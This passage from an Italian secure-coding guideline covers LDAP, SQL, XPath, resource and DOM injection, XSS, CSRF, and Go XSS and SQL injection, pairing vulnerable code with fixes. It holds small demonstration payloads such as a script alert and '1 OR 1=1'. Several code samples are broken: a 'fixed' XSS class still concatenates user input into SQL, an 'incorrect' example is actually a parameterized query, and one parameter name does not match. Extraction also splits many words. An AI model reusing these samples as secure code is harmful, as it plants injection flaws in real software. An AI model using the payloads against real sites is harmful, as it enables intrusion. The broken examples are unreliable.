crittografata (encrypted). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.10.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
 
 
Linee guida per lo sviluppo sicuro Pag. 138  a 156  
 
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.10.6  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.10.7  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
Esempio:  
Nella seguente query, realizzata concatenando strin ghe provenienti dall’input, la SQL injection è molt o 
semplice da realizzare:  
Query = “Insert into Utenti Values(‘” & textbox1.te xt & “‘,'” & textbox2.text & “‘)” 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 139  a 156  
 
L’uso di query parametriche protegge dalla possibil ità di subire attacchi di SQL Injection. La query d iventa la 
seguente:  
SqlCommand cmd = new SqlCommand( “Insert into Utent i Values(@username,@password)”, 
conn) 
cmd.Parameters.AddWithValue (“@username”,TextBox1.t ext) 
cmd.Parameters.AddWithValue (“@usercode”,TextBox2.t ext) 
cmd.ExecuteNonQuery(); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.10.8  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio: 
Un esempio di una ricerca all’interno din un docuem ento XML a partire da input esterno non verificato:  
customers.SelectNodes("//customer[@name='" + txtUse r.Text + "' and 
    @password='" + txtPassword.Text + "']") 
Il codice dovrebbe essere precompilato come il segu ente. Si tratta, come si può vedere, di una query 
parametrica, la stessa soluzione valida per mitigar e il rischio delle SQL injection: 
XPathNodeIterator custData = XPathCache.Select( 
   "//customer[@name=$name and @password=$password] ", 
    customersDocument, 
    new XPathVariable("name", txtName.Text),  
    new XPathVariable("password", txtPassword.Text) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
7.11  AJAX 
AJAX, acronimo di Asynchronous JavaScript and XML, è una tecnica di sviluppo software per la realizzaz ione 
di applicazioni web interattive (Rich Internet Appl ication). Le vulnerabilità di questo linguaggio son o molto 
simili a quelle presenti nel linguaggio JavaScript.   
Generalmente infatti si tratta di una tecnologia ch e fa uso di Javascript per veicolare dati, senza do ver 
ricaricare la pagina corrente.  
I dati vengono trasmessi nel formato XML. 
Di seguito l’elenco delle principali vulnerabilità e delle relative contromisure da adottare. 
 
 
Linee guida per lo sviluppo sicuro Pag. 140  a 156  
 
7.11.1   Client Dom Code Injection 
Come riconoscerla 
Un attaccante può eseguire codice arbitrario sulla macchina dell’application server. A seconda dei per messi 
di cui dispone l’applicazione, potrebbe: accedere a l database, leggere o modificare dati sensibili; le ggere, 
creare, modificare o cancellare file; aprire una co nnessione al server dell’attaccante; modificare il 
contenuto delle pagine; decifrare dati utilizzando le chiavi dell’applicazione; arrestare o avviare i servizi del 
sistema operativo; organizzare un reindirizzamento verso siti fake (fasulli) per operazioni di phishin g; 
prendere il completo controllo del server. 
Accade perché l'applicazione esegue alcune azioni e seguendo codice incluso nei dati in input non 
opportunamente validati e verificati. In questo cas o, il codice non attendibile viene letto dal browse r ed 
eseguito sul lato client. 
 
Come difendersi 
Come prima cosa, l'applicazione non dovrebbe esegui re alcun codice non attendibile da qualsiasi fonte 
esterna possa provenire, inclusi l’input dell'utent e, dei file caricati (upload) o un database. 
Se è necessario passare dati non attendibili all'es ecuzione dinamica, applicare una convalida dei dati  molto 
rigorosa. Come al solito, occorre convalidare tutti  gli input, indipendentemente dalla fonte. I parame tri 
devono essere limitati a un set di caratteri consen tito e l'input non convalidato deve essere eliminat o. Oltre 
ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo di validità, il fo rmato e 
l’eventuale corrispondenza all’interno dei valori p revisti (white list). Sconsigliata invece la black list, ossia un 
elenco di valori non consentiti: l’elenco sarebbe s empre troppo limitato, rispetto ai casi che potrebb ero 
verificarsi. 
Se è assolutamente necessario includere dati estern i nell'esecuzione dinamica, è consentito passare i dati 
come parametri al codice, ma bisogna evitare assolu tamente di eseguire direttamente i dati utente. 
L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
Evitare di creare codice XML o JSON in modo dinamic o.  
Proprio come la creazione di codice HTML o SQL potr ebbero causare dei bug di XML Injection, utilizzare  una 
libreria di codifica o delle librerie JSON o XML af fidabili per rendere sicuri gli attributi dei dati degli 
elementi. 
Non eseguire la crittografia nel codice lato client . Utilizzare le tecnologie TLS/SSL e crittografare le 
informazioni sul server. 
Evitare di chiamare dinamicamente una funzione senz a averne prima bonificato il codice. 
 
Esempio: 
var  input = document .getElementById( "id" ).value; 
window .setInterval( myFunc(input), 1000 ); 
 
Questo il software corretto dopo la sanitizzazione:  
var  input = document .getElementById( "id" ).value; 
var  trusted = escape (input); 
window .setInterval( myFunc(trusted), 1000 ); 
 
Esempio  
Uso corretto dell’aggiornamento dinamico dell'HTML nel DOM:  
document.write("<%=Encoder.encodeForJS(Encoder.enco deForHTML(untrustedData))%>"); 
 
Nel caso debba essere impostato del codice Javascri pt per delle chiamate dinamiche, vanno utilizzati s olo 
metodi predefiniti o codice Javascript non influenz abile da variabili dinamiche. Non si deve usare cod ice con 
routine tipo “eval()” particolarmente vulnerabili. 
 
Esempio di codice Javascript sicuro:  
window .setInterval( "timedFunction();" , 1000 ); 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 141  a 156  
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, Improper Control of 
Generation of Code ('Code Injection') CWE-94. 
 
7.11.2   Client DOM Stored Code Injection 
Come riconoscerla 
L'utente malintenzionato può attraverso questo tipo  di vulnerabilità causare la riscrittura di pagine web e 
l'inserimento di script dannosi per la sicurezza.  
Una vulnerabilità persistente (o stored) come la “C lient DOM Stored Code Injection” è una variante più  
pericolosa di cross-site scripting con manipolazion e di codice: si verifica quando i dati forniti dall 'attaccante 
vengono salvati sul server, e quindi visualizzati i n modo permanente sulle pagine normalmente fornite agli 
utenti durante la normale navigazione. 
Come difendersi 
Occorre evitare qualsiasi esecuzione dinamica del c odice. Se è proprio necessaria, anziché utilizzare i dati 
sul lato client, inclusi i dati precedentemente mem orizzati nella cache dalla stessa applicazione, uti lizzare 
solo dati attendibili provenienti dal server.    
Evitare di chiamare dinamicamente una funzione senz a averne prima bonificato l'input. 
Nel caso debba essere impostato del codice Javascri pt per delle chiamate dinamiche, vanno utilizzati s olo 
metodi predefiniti o codice Javascript non influenz abile da variabili dinamiche o non dipendente da ro utine 
tipo “eval()” non particolarmente sicure. 
 
Esempio di codice Javascript sicuro:  
window .setInterval( "timedFunction();" , 1000 ); 
 
Per ulteriori informazioni ed esempi si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
7.11.3   Client Dom Stored XSS 
 
Come riconoscerla 
Un malintenzionato può utilizzare l'accesso legitti mo all'applicazione per inviare dati ingegnerizzati  al 
database dell'applicazione. Quando un altro utente accede in seguito, le pagine Web potrebbero essere 
riscritte con i dati salvati e potrebbero essere at tivati script dannosi.       
L'applicazione crea pagine web che includono dati p rovenienti dal database, incorporati direttamente 
nell'HTML della pagina. Il browser, quindi, li visu alizza come parte della pagina.  
Il problema nasce quando questi dati salvati sono s tati immessi da un altro utente. Se i dati includon o 
frammenti HTML o Javascript malevoli, anche questi vengono visualizzati (o eseguiti), sebbene la vitti ma 
non si accorga dell’inganno sottostante. La vulnera bilità è perciò il risultato dell'incorporazione di  dati 
arbitrari provenienti dal database, senza prima cod ificarli. La codifica trasforma i caratteri malevol i in 
normale testo, e il browser non può più trattarli c ome codice valido HTML/Javascript. 
 
Come difendersi 
I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve ess ere 
eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo d i validità, il 
formato e l’eventuale corrispondenza all’interno de i valori previsti (white list). Sconsigliata invece  la black 
list, ossia una lista di valori non consentiti: l’e lenco sarebbe sempre troppo limitato, rispetto ai c asi che 
potrebbero verificarsi. 
 
 
Linee guida per lo sviluppo sicuro Pag. 142  a 156  
 
L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
La convalida non sostituisce la codifica (encoding) , ossia la neutralizzazione di tutti i caratteri 
potenzialmente eseguibili. Tutti i dati dinamici, i ndipendentemente dall'origine, devono essere codifi cati 
prima di incorporarli nell'output. La codifica dovr ebbe essere sensibile al contesto, in base al tipo di dato 
che si vuole neutralizzare: se ci si aspetta che po ssa esserci codice HTML abusivo, occorre codificare  gli 
eventuali tag HTML, se ci si potrebbe trovare di fr onte a uno script, allora bisogna codificare gli el ementi 
sintattici di Javascript, ecc. 
Nell'intestazione della risposta HTTP Content-Type,  definire esplicitamente la codifica dei caratteri (set di 
caratteri) per l'intera pagina. 
Impostare il flag httpOnly sul cookie di sessione, per impedire agli exploit XSS di rubarlo. 
 
Esempio di HTML richiamato nel codice Javascript: l a stringa in uscita è codificata nella pagina Html prima 
che venga visualizzata nell’etichetta relativa: 
public class StoredXssFixed  
{ 
    public  string  foo (Label lblOutput, SqliteConnection connection, 
HttpServerUtility Server, string  id) 
    { 
        SqliteConnection connection = new  SqliteConnection(connectionString) 
        string  sql = "select email from CustomerLogin where customerNumb er = "  + 
id; 
        SqliteCommand cmd = new  SqliteCommand(sql, connection); 
        string  output = ( string )cmd.ExecuteScalar(); 
        lblOutput.Text = String.IsNullOrEmpty(outpu t) ? "Customer Number does not 
exist"  : Server.HtmlEncode(output);         
    } 
} 
 
Esempio Javascript per Client Dom Stored XSS.  
Forma non corretta (routine completa): 
<!DOCTYPE html> 
<html> 
<head> 
 <meta charset="utf-8"> 
 <title>XSS Example</title> 
 <script 
src="http://ajax.googleapis.com/ajax/libs/jquery/1. 6.4/jquery.min.js"></script> 
 <script> 
  $(function() { 
   $('#users').each(function() { 
    var select = $(this); 
    var option = select.children('option').first();  
    select.after(option.text()); 
    select.hide(); 
   }); 
  }); 
 </script> 
</head> 
<body> 
 <form method="post"> 
  <p> 
   <select id="users" name="users"> 
    <option 
value="bad">&lt;script&gt;alert(&#x27;xss&#x27;);&l t;/script&gt;</option> 
   </select> 
  </p> 
 </form> 
</body> 
</html> 
 
Forma corretta (fix relativa alle stringa modificat a): 
 
 
Linee guida per lo sviluppo sicuro Pag. 143  a 156  
 
la funzione after() accetta un elemento DOM, quindi  consente di creare un nodo di testo: 
select.after(document.createTextNode(option.text()) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/97.html,  
CWE-97: Improper Neutralization of Server-Side Incl udes (SSI) Within a Web Page. 
7.11.4  Client Dom XSS 
Come riconoscerla 
Un utente malintenzionato può utilizzare il social engineering per indurre un utente a inviare l'input  
modificato in modo malevolo verso il sito Web, ad e sempio inducendolo a cliccare su un URL con un’anco ra 
(hash) modificata, facendo sì che il browser riscri va le pagine Web. L'aggressore può quindi dirottare  la 
vittima verso un server fake (fasullo), che gli con sentirebbe di rubare la password dell'utente, farsi  inserire i 
dati della carta di credito, fornire informazioni f alse o eseguire del malware. Ovviamente la vittima rimane 
ignara di ciò che accade. 
L’attacco è possibile perché la pagina Web dell'app licazione incorpora nella pagina dati provenienti 
dall'input dell'utente (incluso l'URL della pagina) , facendo sì che il browser li visualizzi come part e della 
pagina Web. Se l'input include frammenti HTML o Jav aScript, anche questi vengono visualizzati (ed 
eseguiti). La vulnerabilità è il risultato dell'inc orporamento di input dell'utente arbitrario senza p rima 
codificarlo in un formato che impedirebbe al browse r di trattarlo come HTML anziché come testo normale . 
 
Come difendersi 
I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve ess ere 
eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo d i validità, il 
formato e l’eventuale corrispondenza all’interno de i valori previsti (white list). Sconsigliata invece  la black 
list, ossia un elenco di valori non consentiti: l’e lenco sarebbe sempre troppo limitato, rispetto ai c asi che 
potrebbero verificarsi. 
Effettuare un encoding (codifica) su tutti i dati d inamici prima di includerli nella pagina web. Consi derare 
per tale scopo la libreria ESAPI4JS di OWASP. 
 
Per creare dinamicamente URL in JavaScript, utilizz are la libreria OWASP ESAPI4JS: 
window.location = ESAPI4JS.encodeForURL(input); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/97.html ,  
CWE-97: Improper Neutralization of Server-Side Incl udes (SSI) Within a Web Page. 
7.11.5   Client Resource Injection 
Come riconoscerla 
Un malintenzionato potrebbe essere in grado di apri re una backdoor che gli consente di connettersi 
direttamente al server delle applicazioni, portando  potenzialmente al controllo del server o ad altri attacchi 
indiretti. In particolare, modificando il numero di  porta del socket, il malintenzionato può essere in  grado di 
bypassare insufficienti controlli di rete o offusca re l'attacco da parte dei dispositivi di rete. Inol tre, questa 
vulnerabilità può essere sfruttata per bypassare i firewall o altri meccanismi di controllo degli acce ssi; 
utilizzare l'applicazione come proxy per la scansio ne delle porte delle reti interne e l'accesso diret to ai 
sistemi locali; o indurre erroneamente l'utente a i nviare informazioni riservate a un server fasullo.  
Come difendersi 
Non consentire a un utente, direttamente o indirett amente, di definire i parametri dei socket o altre 
impostazioni di rete. 
Se possibile, limitare i WebSocket agli URL predefi niti. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 144  a 156  
 
Esempio: 
Qui viene aperto un socket con i dati (non validati ) dell’utente: 
 
var unsafe_socket; 
function createSocketToServer_Unsafe() {  
 var params = new URLSearchParams(document.location .search); 
 var wsurl = params.get("ws_url");  
 
  unsafe_socket = new WebSocket(wsurl); 
 unsafe_socket.onopen = function(){ 
   sendMessage(unsafe_socket); 
 } 
 unsafe_socket.onmessage = function(msg){ 
   receiveMessage(unsafe_socket); 
 } 
} 
 
Qui di seguito, invece, la versione sicura: 
var safe_socket_hc; 
function createSocketToServer_SafeHardcoded() {  
  safe_socket_hc = new WebSocket(SERVER_WS_URL); 
 safe_socket_hc.onopen = function(){ 
   sendMessage(safe_socket_hc); 
 } 
 safe_socket_hc.onmessage = function(msg){ 
   receiveMessage(safe_socket_hc); 
 } 
} 
 
Maggiori informazioni: http://cwe.mitre.org/data/de finitions/99.html 
 
7.11.6   Client Second Order Sql Injection 
Come riconoscerla 
L'applicazione comunica con il suo database inviand o una query SQL testuale. L'applicazione crea la qu ery 
semplicemente concatenando le stringhe con dati ott enuti dal database. Poiché tali dati potrebbero ess ere 
stati precedentemente ottenuti dall'input dell'uten te e non sono stati verificati né tanto meno bonifi cati, 
potrebbero contenere comandi SQL, che potrebbero es sere interpretati come tali dal database. 
In questo modo, un malintenzionato può accedere dir ettamente a tutti i dati del sistema. L'aggressore 
sarebbe in grado di rubare qualsiasi informazione s ensibile memorizzata dal sistema (come i dettagli 
personali dell'utente o le carte di credito) e poss ibilmente modificare o cancellare i dati esistenti.  
Come difendersi 
Procedere con la validazione dei dati, prima di sal varli nel database. 
Effettuare sempre la validazione dell’input, prima di utilizzarlo all’interno dell’applicazione. Occor re 
controllare il tipo del dato, la sua dimensione, l' intervallo di validità (range), il formato ed event uali valori 
attesi (white list). 
Occorre verificare sempre l’input, fissando control li rigidi che impediscano di immettere caratteri e tipi di 
dati potenzialmente dannosi. L’optimum è designare una white list di valori ammessi e scartare tutto c iò 
che non vi rientra.  
Codificare completamente tutti i dati dinamici prim a di incorporarli nella pagina web (encoding). La c odifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si as petta che 
possa esserci codice HTML abusivo, occorre codifica re gli eventuali tag HTML, se ci si potrebbe trovar e di 
fronte a uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
Invece di concatenare le stringhe:  
• Utilizzare componenti di database sicuri come le st ored procedure, query parametrizzate e le 
associazioni degli oggetti (per comandi e parametri ).  
 
 
Linee guida per lo sviluppo sicuro Pag. 145  a 156  
 
• Una buona soluzione è quella di utilizzare una libr eria ORM, come EntityFramework, Hibernate o 
iBatis. 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al principio del minimo 
privilegio. 
 
Esempio - Javascript per Client Second Order Sql In jection. 
Forma non corretta: 
var userId = 5; 
var query = connection.query('SELECT * FROM users W HERE id = ?', [userId], 
function(err, results) { 
 //query.sql returns SELECT * FROM users WHERE id =  '5' 
}); 
 
Forma corretta: 
var post = {id: 1, title: 'Hello MySQL'}; 
var query = connection.query('INSERT INTO posts SET  ?', post, function(err, 
result) { 
 //query.sql returns INSERT INTO posts SET `id` = 1 , `title` = 'Hello MySQL' 
}); 
7.11.7   Client Sql Injection 
Come riconoscerla 
Utilizzando questa vulnerabilità un attaccante potr ebbe utilizzare i canali di comunicazione tra 
l'applicazione e il suo database, ossia modificando  ad arte una query SQL testuale. Ciò è reso possibi le nei 
casi in cui l’applicazione costruisce dinamicamente  le query concatenandole con l’input dell’utente. S e non 
a questo non sono stati applicati i controlli di va lidità, l’attaccante potrebbe modificare i comandi SQL nel 
senso da lui desiderato. 
Come difendersi 
Valgono le considerazioni e le contromisure esposte  nel punto precedente. 
 
Esempio - Javascript per Client SQL Injection  
Forma non corretta: 
var info = { 
 userid: message.author.id 
} 
 
connection.query("SELECT * FROM table WHERE userid = '" + message.author.id + "'", 
info, function(error) { 
 if (error) throw error; 
}); 
 
Forma corretta: 
var sql = "SELECT * FROM table WHERE userid = ?"; 
var inserts = [message.author.id]; 
sql = mysql.format(sql, inserts); 
 
Per ulteriori informazioni vedere: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
 
7.11.8   Cross-Site Request Forgery (CSRF)  
Come riconoscerla 
Il  Cross-Site Request Forgery , abbreviato CSRF o anche XSRF, è una vulnerabilità a cui sono esposti i siti 
web dinamici quando sono progettati per ricevere ri chieste da un client senza meccanismi per controlla re 
 
 
Linee guida per lo sviluppo sicuro Pag. 146  a 156  
 
se la richiesta sia stata inviata intenzionalmente oppure no. Diversamente dal cross-site scripting (X SS), che 
sfrutta la fiducia di un utente in un particolare s ito, il CSRF sfrutta la fiducia di un sito nel brow ser di un 
utente. 
Nelle applicazioni Web 2.0 Ajax comunica con i serv izi Web di back-end tramite XML-RPC, SOAP o REST. È  
possibile invocarli tramite interrogazioni di tipo GET e POST che effettuano chiamate cross-site ai se rvizi 
web. La tecnologia di tipo Cross-Site Request Forge ry permette di manipolare queste chiamate indebolen do 
la sicurezza del sistema. 
Un attaccante induce la sua vittima a inviare incon sapevolmente una richiesta HTTP dal suo browser al 
sistema web dove è attualmente autenticato. Il sist ema, vulnerabile al CSRF, avendo la certezza che la  
richiesta provenga dall'utente già precedentemente autenticato la esegue senza sapere che in realtà di etro 
la richiesta si cela un'azione pensata dall'attacca nte come ad esempio un trasferimento di fondi, un 
acquisto di beni, una richiesta di dati o qualsiasi  altra funzione offerta dall'applicazione vulnerabi le. Ci sono 
innumerevoli modi con i quali un utente può essere ingannato nell'inviare una richiesta pensata da un 
attaccante: per esempio nascondendola in un element o HTML di un'immagine, una XMLHttpRequest o un 
URL. 
Come difendersi 
Usare framework, librerie, moduli e in generale cod ice fidato che permettano allo sviluppatore di evit are 
l'introduzione di questa vulnerabilità. L’uso di un  token antifalsificazione è di solito la scelta mig liore. 
Nei form che permettono operazioni importanti inser ire un campo hidden valorizzandolo con una stringa 
random. La stessa stringa, va impostata come variab ile di sessione, in questo modo non è rintracciabil e lato 
client ed è nota solo al server. Una volta compiuta  la submit del form, se il valore della variabile d i sessione 
corrisponde alla value del sopracitato campo hidden , la richiesta è da considerarsi valida. 
Identificare le operazioni che possano risultare pe ricolose e quando un utente genera un'operazione di  
questo tipo inviare una richiesta addizionale di co nferma all'utente, per esempio, la richiesta di una  
password, che deve essere verificata prima di esegu ire l'operazione. 
Non utilizzare il metodo GET per il passaggio di pa rametri da una pagina web all'altra soprattutto per  quelle 
richieste che comportano un cambiamento di stato co me ad esempio la modifica di dati. Controllare il 
campo di intestazione HTTP referer per vedere se la  richiesta è stata generata da una pagina valida. 
Verificare che il sistema sia esente da vulnerabili tà di tipo cross-site scripting poiché la difesa da  CSRF può 
essere rafforzata da queste contromisure.  
Dal lato utente è buona abitudine eseguire sempre i l logout da siti web sensibili prima di visitare al tre 
pagine web. 
 
Per ulteriori informazioni vedere: http://cwe.mitre.org/data/definitions/352.html ,  
CWE-352: Cross-Site Request Forgery (CSRF). 
 
Esempio: 
Viene introdotto per un campo in input un token ant ifalsificazione: 
<form action="/Home/Test" method="post"> 
  <input name="__RequestVerificationToken" type="hi dden"   
      value="6fGBtLZmVBZ59oUad1Fr33BuPxANKY9q3Srr5y [...]" />   
  <input type="submit" value="Submit" /> 
</form> 
Per evitare l’invio del token in JSON, da parte del lo script Ajax, lo si può includere in un’intestazi one http 
dettagliata: 
<script> 
  @functions{ 
    public string TokenHeaderValue() 
    { 
      string cookieToken, formToken; 
      AntiForgery.GetTokens(null, out cookieToken, out formToken); 
      return cookieToken + ":" + formToken;         
    } 
  } 
 
 
Linee guida per lo sviluppo sicuro Pag. 147  a 156  
 
 
  $.ajax("api/values", { 
    type: "post", 
    contentType: "application/json", 
    data: { }, // JSON data goes here 
    dataType: "json", 
    headers: { 
      'RequestVerificationToken': '@TokenHeaderValu e()' 
    } 
  }); 
</script> 
 
7.12  GO 
Go è un linguaggio di programmazione open source, s viluppato da Google e pubblicato per la prima volta  
nel 2009. È nato dall’esigenza di avere un linguagg io facile da imparare, specializzato nella programm azione 
concorrente e che avesse un compilatore in grado di  produrre eseguibili efficienti e veloci. La sintas si è 
molto simile al C. 
7.12.1  Client Dom Stored XSS 
Come riconoscerla 
Cross-site scripting (XSS) è una vulnerabilità che affligge siti web dinamici che impiegano un insuffi ciente 
controllo dell'input, in qualsiasi modo pervenuto. Un attacco di XSS permette a un malintenzionato di 
inserire o eseguire codice lato client al fine di a ttuare un insieme variegato di operazioni quali ad esempio: 
raccolta, manipolazione e reindirizzamento di infor mazioni riservate, visualizzazione e modifica di da ti 
presenti sui server, alterazione del comportamento dinamico delle pagine web ecc.  
GO, proprio come qualsiasi altro linguaggio di prog rammazione multiuso, è vulnerabile a XSS nonostante  la 
documentazione indirizzi chiaramente sull'utilizzo di html/template package.  
In riferimento al seguente frammento di codice: 
 
package main 
import "net/http"  
import "io" 
func handler (w http.ResponseWriter, r 
*http.Request) {  io.WriteString(w, 
r.URL.Query().Get( "param1" )) 
} 
func main () {  
http.HandleFunc( "/" , handler)  
http.ListenAndServe( ":8080" , nil )  
} 
 
Questo codice crea e avvia un server HTTP in ascolt o sulla porta 8080 (main()) gestendo le richieste s ulla 
root del server (/).  
La funzione handler(), che gestisce le richieste, p revede un parametro query stringa Param1, il cui va lore 
viene quindi scritto nel flusso di risposta (w):  
Se param1=test, il Content-Type sarà inviato come t ext/plain:  
 
 
Linee guida per lo sviluppo sicuro Pag. 148  a 156  
 
 
 
Se param1=<h1>, il Content-Type sarà inviato come t ext/html (ciò rende vulnerabile a XSS):  
 
Si potrebbe pensare che rendere param1 uguale a qua lsiasi tag HTML porti allo stesso comportamento, ma  
non è così: param1=<h2>, param1=<span>, param1=<for m> non modificano Content-Type in text/html, 
bensì in plain / text.  
Se param1=<script>alert(1)</script>, il Content-Typ e sarà inviato come text/html e il valore sarà rest ituito e 
quindi facilmente interpretato tramite l’alert (XSS  - Cross Site Scripting):  

 
 
Linee guida per lo sviluppo sicuro Pag. 149  a 156  
 
 
 
Come difendersi 
Sostituire il text/template package con html/templa te: 
package main 
import "net/http"  
import "html/template" 
func handler(w http.ResponseWriter, r *http.Request) 
{ param1 := r.URL.Query().Get( "param1" ) 
tmpl := template.New( "hello" )  
tmpl, _ = tmpl.Parse( `{{define "T"}}{{.}}{{end}}` )  
tmpl.ExecuteTemplate(w, "T" , param1)  
} 
 
func main() {  
http.HandleFunc( "/" , handler)  
http.ListenAndServe( ":8080" , nil )  
} 
 
 
Se param1= <h1>, l'intestazione di risposta HTTP Content-Type  non verrà inviata come text/plain  : 
 
 
Param1 è correttamente codificato sul browser:  

 
 
Linee guida per lo sviluppo sicuro Pag. 150  a 156  
 
 
7.12.2  SQL Injection 
Come riconoscerla 
L’SQL Injection nasce dalla mancata/non corretta co difica dei dati di input/output. Partendo dalla que ry di 
esempio riportata di seguito: 
ctx := context.Background()  
customerId := r.URL.Query().Get( "id" )  
query := "SELECT number, expireDate, cvv FROM creditcards WH ERE customerId = "  + 
customerId 
row, _ := db.QueryContext(ctx, query) 
 
Quando viene fornito un customerId valido, la query  restituisce l’elenco delle carte di credito del cl iente. 
Tuttavia, se customerId non è un valore, ma una str inga (concatenazione di diversi valori/simboli) com e 
nell’esempio che segue: 
 
SELECT number , expireDate, cvv  FROM creditcards  WHERE customerId =  1 OR 1=1 
 
La query restituirebbe (a meno di opportune verific he dei dati immessi in input) tutti i record della tabella 
relativamente a tutti i clienti censiti poiché la c ondizione 1 = 1 sarà ‘truè per qualsiasi record. 
Come difendersi 
Impostare i placeholder: 
 
ctx := context.Background()  
customerId := r.URL.Query().Get( "id" )  
query := "SELECT number, expireDate, cvv FROM creditcards WH ERE customerId = ?" 
stmt, _ := db.QueryContext(ctx, query, customerId) 
 
La sintassi è specifica: 
MySQL  PostgreSQL  Oracle  
   
WHERE col = ? WHERE col = $1 WHERE col = :col 
VALUES(?, ?, ?) VALUES($1, $2, $3) VALUES(:val1, :val2, :val3) 
   
 

